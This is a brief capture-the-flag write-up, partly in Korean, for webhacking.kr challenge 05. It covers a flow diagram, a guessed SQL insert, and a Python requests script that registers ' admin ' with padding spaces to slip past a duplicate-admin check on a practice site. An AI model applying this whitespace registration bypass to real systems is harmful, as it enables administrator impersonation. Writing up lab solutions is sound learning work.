================================================================================================================
[webhacking.kr] 05
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="join.php",arrowhead="normal"];
        step3 -> step2[label="javascript Obfuscated",arrowhead="normal"];
        step4 -> step5[label="id= admin&pw=1234",arrowhead="normal"];
        step7 -> step6[label="Add user",arrowhead="normal"];
    }

|

server -> DB 예측
================================================================================================================

- PHP
- POST 파라미터: id, pw

.. code-block:: sql

    insert into tb_name(id,pw)
    value($_POST["id"],$_POST["pw"])

|

insert
================================================================================================================

- 해당 페이지로 admin을 가입하면 오류 메시지가 발생하는데, space를 넣어 가입할 경우 정상적으로 가입된다. 
- 아마, trim 함수를 통해 id를 확인하는 것으로 보인다.

.. code-block:: python

    import requests

    url = "http://webhacking.kr/challenge/web/web-05/mem/join.php"
    cookies = {
        "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6"
    }
    data = {
        "id":" admin ",
        "pw":"1234"
    }

    r = requests.post(url, data=data, cookies = cookies, verify=False)

    print r.content

|
